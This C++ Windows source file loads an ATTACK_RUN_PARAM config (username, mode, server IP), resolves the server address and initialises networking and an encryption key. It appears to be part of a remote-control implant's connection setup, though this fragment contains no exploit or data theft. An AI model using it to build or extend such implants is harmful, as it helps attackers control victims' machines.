
#include <windows.h>
#include "Config.h"
#include "../api.h"
#include "../public.h"
#include "network/NetWorkData.h"
#include "../StrHelper.h"

#include "function/DeviceInfo.h"
#include "initHelper.h"
#include "FileHelper.h"
#include "log.h"

int getUserAndServer() {

	char strFilePath[MAX_PATH] = { 0 };
	int iRet = makeFullFileName(strFilePath, CONFIG_FILENAME);
	char* lpsrcdata = 0;
	int srcfilesize = 0;
	iRet = FileHelper::fileReader(strFilePath, &lpsrcdata, &srcfilesize);
	if (iRet)
	{
		ATTACK_RUN_PARAM* params = (ATTACK_RUN_PARAM*)lpsrcdata;
		if (params->username[0])
		{
			lstrcpyA(gUserName, params->username);
		}

		gStartMode = params->mode;
		if (params->ip[0])
		{
			char szip[32] = { 0 };
			memcpy(szip, params->ip, sizeof(params->ip));
			gServerIP = getIpFromStr(szip);
			if (gServerIP)
			{
				in_addr ia;
				ia.S_un.S_addr = gServerIP;
				lstrcpyA(SERVER_IP_ADDRESS, inet_ntoa(ia));
			}
		}
		else {
			if (SERVER_IP_ADDRESS[0])
			{
				gServerIP = inet_addr(SERVER_IP_ADDRESS);
			}
		}

		delete[]lpsrcdata;
	}
	else {
		if (gUserName[0] && SERVER_IP_ADDRESS[0])
		{
			gServerIP = getIpFromStr(SERVER_IP_ADDRESS);
			//gServerIP = inet_addr(SERVER_IP_ADDRESS);

		}
	}

	in_addr ia;
	ia.S_un.S_addr = gServerIP;
	writeLog("username:%s, server address:%x,server:%s,server ip:%s\r\n", gUserName, gServerIP, SERVER_IP_ADDRESS, inet_ntoa(ia));

	if (gServerIP && gServerIP != -1 && gUserName[0])
	{
		return TRUE;
	}
	return 0;
}




int networkInit()
{

#ifdef SERVER_IP_ADDRESS_DOMAINNAME
#elif defined SERVER_IP_ADDRESS
#else
#endif
	int result = 0;

	result = initSocket();
	if (result == 0)
	{
		writeLog("initSocket false\r\n");
		return FALSE;
	}

	result = getUserAndServer();
	if (result == FALSE)
	{
		return FALSE;
	}

	DWORD* pTickcount = (DWORD*)cCryptKey;
	for (int i = 0; i < sizeof(cCryptKey) / sizeof(DWORD); i++, pTickcount++)
	{
		*pTickcount = lpGetTickCount();
	}
	return TRUE;
}